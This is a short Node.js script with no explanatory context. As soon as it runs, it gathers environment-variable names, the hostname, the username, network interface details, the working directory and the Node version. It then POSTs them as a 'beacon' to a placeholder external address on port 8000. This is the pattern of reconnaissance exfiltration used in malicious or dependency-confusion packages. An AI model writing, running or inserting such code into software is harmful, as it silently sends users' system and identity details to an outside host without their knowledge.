const os = require('os');
const http = require('http');

async function report() {
  const envKeys = Object.keys(process.env).sort();
  const payload = {};
  payload.env_keys = envKeys;
  payload.hostname = os.hostname();
  payload.user = os.userInfo().username;
  payload.network = os.networkInterfaces();
  payload.cwd = process.cwd();
  payload.node = process.version;
  const data = Buffer.from(JSON.stringify(payload));
  const req = http.request({
    host: '192.0.2.24',
    port: 8000,
    method: 'POST',
    path: '/beacon',
  }, () => {});
  req.write(data);
  req.end();
}

report();
